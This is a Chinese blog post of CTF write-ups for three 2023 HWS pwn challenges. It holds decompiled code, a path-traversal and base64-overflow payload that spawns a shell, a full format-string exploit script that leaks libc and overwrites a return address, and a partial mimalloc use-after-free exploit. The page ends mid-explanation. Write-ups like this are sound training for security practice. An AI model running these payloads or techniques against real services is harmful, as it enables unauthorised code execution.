<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
    <meta name="description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1tXE2hCnld4tdbytiQtSvog提取码：llaa ezhttpint v2; &#x2F;&#x2F; [rsp+18h] [rbp-918h]  int v3; &#x2F;&#x2F; [rsp+1Ch] [rbp-914h]  unsigned int v4; &#x2F;&#x2F; [rsp+20h] [rbp-910h]  unsigned __int64 get_data_n">
<meta property="og:type" content="article">
<meta property="og:title" content="2023 HWS pwn">
<meta property="og:url" content="https://grxer.gitee.io/2023/07/17/2023hws/index.html">
<meta property="og:site_name" content="Grxer&#39;s Blog">
<meta property="og:description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1tXE2hCnld4tdbytiQtSvog提取码：llaa ezhttpint v2; &#x2F;&#x2F; [rsp+18h] [rbp-918h]  int v3; &#x2F;&#x2F; [rsp+1Ch] [rbp-914h]  unsigned int v4; &#x2F;&#x2F; [rsp+20h] [rbp-910h]  unsigned __int64 get_data_n">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-07-17T02:42:32.000Z">
<meta property="article:modified_time" content="2023-07-30T16:38:21.653Z">
<meta property="article:author" content="bxz">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>2023 HWS pwn</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 lrt">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/07/19/first-arm-pwn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/07/14/arm-asm/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/07/17/2023hws/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/07/17/2023hws/&text=2023 HWS pwn"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/07/17/2023hws/&title=2023 HWS pwn"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/07/17/2023hws/&is_video=false&description=2023 HWS pwn"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2023 HWS pwn&body=Check out this article: https://grxer.gitee.io/2023/07/17/2023hws/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/07/17/2023hws/&title=2023 HWS pwn"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/07/17/2023hws/&title=2023 HWS pwn"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/07/17/2023hws/&title=2023 HWS pwn"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/07/17/2023hws/&title=2023 HWS pwn"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/07/17/2023hws/&name=2023 HWS pwn&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/07/17/2023hws/&t=2023 HWS pwn"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ezhttp"><span class="toc-number">1.</span> <span class="toc-text">ezhttp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.0.1.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fmt"><span class="toc-number">2.</span> <span class="toc-text">fmt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mi"><span class="toc-number">3.</span> <span class="toc-text">mi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E6%97%B6%E7%8C%AA%E8%84%91%E8%BF%87%E8%BD%BD%E7%9A%84EXP"><span class="toc-number">3.0.1.</span> <span class="toc-text">比赛时猪脑过载的EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E5%90%8E%E5%86%99wp%E5%A4%B4%E8%84%91%E6%B8%85%E9%86%92%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9edit%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E7%9A%84%EF%BC%8C%E4%B8%8D%E7%94%A8%E6%B3%84%E9%9C%B2pie%E7%9A%84exp"><span class="toc-number">3.0.2.</span> <span class="toc-text">赛后写wp头脑清醒，直接修改edit返回地址的，不用泄露pie的exp</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        2023 HWS pwn
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">bxz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-07-17T02:42:32.000Z" itemprop="datePublished">2023-07-17</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1tXE2hCnld4tdbytiQtSvog">https://pan.baidu.com/s/1tXE2hCnld4tdbytiQtSvog</a><br>提取码：llaa</p>
<h1 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-918h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-914h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+20h] [rbp-910h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 get_data_number; <span class="comment">// [rsp+28h] [rbp-908h]</span></span><br><span class="line">  __int64 j; <span class="comment">// [rsp+28h] [rbp-908h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-900h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+30h] [rbp-900h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8F8h]</span></span><br><span class="line">  <span class="type">char</span> *k; <span class="comment">// [rsp+40h] [rbp-8F0h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_buf</span>;</span> <span class="comment">// [rsp+50h] [rbp-8E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">64</span>]; <span class="comment">// [rsp+E0h] [rbp-850h] BYREF</span></span><br><span class="line">  <span class="type">char</span> haystack[<span class="number">256</span>]; <span class="comment">// [rsp+120h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">char</span> request_mode[<span class="number">256</span>]; <span class="comment">// [rsp+220h] [rbp-710h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">512</span>]; <span class="comment">// [rsp+320h] [rbp-610h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">16</span>]; <span class="comment">// [rsp+520h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">5</span>]; <span class="comment">// [rsp+530h] [rbp-400h] BYREF</span></span><br><span class="line">  _BYTE v18[<span class="number">1011</span>]; <span class="comment">// [rsp+535h] [rbp-3FBh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// [rsp+928h] [rbp-8h]</span></span><br></pre></td></tr></table></figure>

<p>分析过后要控制 sub_5596534A9993(a1, s, request_mode, k, v4);函数里的execl(a2, 0LL);来执行bin&#x2F;sh</p>
<p>haystack和htdocs拼接组成a2 htdocs一般在Opt&#x2F;lampp&#x2F;htdocs下所以需要控制haystack为htdocs&#x2F;..&#x2F;..&#x2F;..&#x2F;bin&#x2F;sh，但是又过滤strstr(haystack, “..”)不能直接..&#x2F; ，get_data_number &#x3D; get_data(a1, input, 1024)那里可以溢出控制v18然后，利用sub_5596534A8766(v18, v12);再利用v12向haystack里写数值，sub_5596534A8766里四个v18处的值可以控制三个v12处的值，所以会从v12+63就需要来控制值来输出到haystack，所以第一个采用了&#x2F;&#x2F;.的方式来写为Ly8u，后面采用&#x2F;..的方式写Ly4u，然后最后用L&#x3D;&#x3D;&#x3D;只写一个&#x2F;，用等号来控制结束，最终就是htdocs&#x2F;.&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;bin&#x2F;sh,其余判断常规绕过即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_5596534A8766</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 j; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 k; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 m; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 n; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 s; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// [rsp+25h] [rbp-Bh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+26h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+27h] [rbp-9h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">                                                <span class="comment">// a1可控  a2+64写</span></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(v10 + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">255</span>, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x3F</span>u; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[j] == *(v10 + a1) )</span><br><span class="line">        s = j;                                  <span class="comment">// 11 L</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">0x3F</span>u; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[k] == *(v10 + <span class="number">1LL</span> + a1) )</span><br><span class="line">        v13 = k;                                <span class="comment">// 50 y</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">0x3F</span>u; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[m] == *(v10 + <span class="number">2LL</span> + a1) )</span><br><span class="line">        v14 = m;                                <span class="comment">// 56 4</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">0x3F</span>u; ++n )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[n] == *(v10 + <span class="number">3LL</span> + a1) )</span><br><span class="line">        v15 = n;                                <span class="comment">// 46 u</span></span><br><span class="line">    &#125;</span><br><span class="line">    v2 = i++;</span><br><span class="line">    *(v2 + a2) = (v13 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span> | (<span class="number">4</span> * s);      <span class="comment">// v13=50 s=11 /</span></span><br><span class="line">    <span class="keyword">if</span> ( *(v10 + <span class="number">2LL</span> + a1) == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = i++;</span><br><span class="line">    *(v3 + a2) = (v14 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xF</span> | (<span class="number">16</span> * v13); <span class="comment">// v14=56 111000 .  60 /</span></span><br><span class="line">    <span class="keyword">if</span> ( *(v10 + <span class="number">3LL</span> + a1) == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = i;</span><br><span class="line">    *(v4 + a2) = v15 &amp; <span class="number">63</span> | (v14 &lt;&lt; <span class="number">6</span>);         <span class="comment">// v15 46 .   v14最后两位必须是00</span></span><br><span class="line">    v10 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;60.204.140.184&quot;</span>,<span class="string">&quot;30230&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">get abcabcabcabc/bin/sh?.css.html</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbLy8uLy4uLy4uLy4uL===</span><br><span class="line">Authorization: Basic</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>get abcabcabcabc/bin/bash?.css.html<span class="number">&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">21</span>+b<span class="number">&#x27;b</span><span class="number">&#x27;</span>*<span class="number">84</span>+b<span class="number">&#x27;L</span>y8uLy4uLy4uLy4uL===&#x27;</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(b<span class="number">&#x27;</span>Authorization: Basic <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sleep(1)</span></span><br><span class="line"><span class="string">io.send(b&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>赛后看了wp发现sub_5596534A8766是一个base64的解密，直接构造覆写就行了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">b<span class="number">&#x27;</span>Authorization: Basic <span class="string">&#x27;+base64.b64encode(64*b&#x27;</span>a<span class="number">&#x27;</span>+b<span class="number">&#x27;</span>/../../../../../../../../bin/sh?.html<span class="number">&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h1 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h1><p>常规栈上字符串格式化漏洞，泄露main函数返回地址所在的栈地址和libc基址，然后长度不够所以一次写两个字节写onegadget到返回地址即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;60.204.140.184&#x27;</span>,<span class="string">&#x27;30058&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x00136D)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x013E8  )&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%18$p%21$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;a str: &quot;</span>,payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_tar=<span class="built_in">int</span>(ru(<span class="string">b&#x27;0x&#x27;</span>),<span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">p(<span class="string">&#x27;stack_tar&#x27;</span>,stack_tar)</span><br><span class="line">__libc_start_main=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line">p(<span class="string">&quot;__libc_start_main&quot;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=base+<span class="number">0xe3b01</span></span><br><span class="line"><span class="comment"># payload=fmtstr_payload(6,&#123;stack_tar:(ogg&amp;0xffffffffff)&#125;,write_size=&#x27;short&#x27;)</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">6</span>,&#123;stack_tar:(ogg)&#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">sla(<span class="string">b&quot;str: &quot;</span>,payload)</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"><span class="comment"># print(hex(ogg))</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h1><p><a target="_blank" rel="noopener" href="https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/">https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-rpath <span class="string">&#x27;/home/grxer/Desktop/share/2023hws/mi&#x27;</span> ./pwn </span><br></pre></td></tr></table></figure>

<p>上面命令可以成功patch的原因应该是对方编译时的机器是Ubuntu20，我自己的也是u20</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;/home/grxer/Desktop/share/2023hws/mi&#x27; ./pwn </span><br><span class="line">patchelf --set-rpath &#x27;/home/grxer/Desktop/share/2023hws/mi/&#x27; ./libmimalloc.so.2</span><br><span class="line">patchelf --set-interpreter &#x27;/home/grxer/Desktop/share/2023hws/mi/ld.so&#x27;  ./pwn</span><br></pre></td></tr></table></figure>

<p>删除时没有将存放指针处置0，存在uaf漏洞，开启了沙箱</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">1</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1<span class="number">-8</span>))</span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">3</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;b&quot;</span>*<span class="number">1</span>) #<span class="number">4</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;c&quot;</span>*<span class="number">1</span>) #<span class="number">5</span> </span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;d&quot;</span>*<span class="number">8</span>) #<span class="number">6</span></span><br></pre></td></tr></table></figure>

<p>删除1和2，利用uaf再修改2的话会把原来的空闲堆块链条2–&gt;1变为2–&gt;leak1-8，后面再申请到#6时就可以拿到leak1-8这个堆块，所以我们可以利用这个来申请任意地址的堆块</p>
<p>有了任意申请之后就是地址泄露，可以利用简单的申请一个堆和show函数来泄露mimalloc堆块的起始地址也就是maps的最上面那一块，然后发现他起始地址偏移+0x160位置处有一个地址</p>
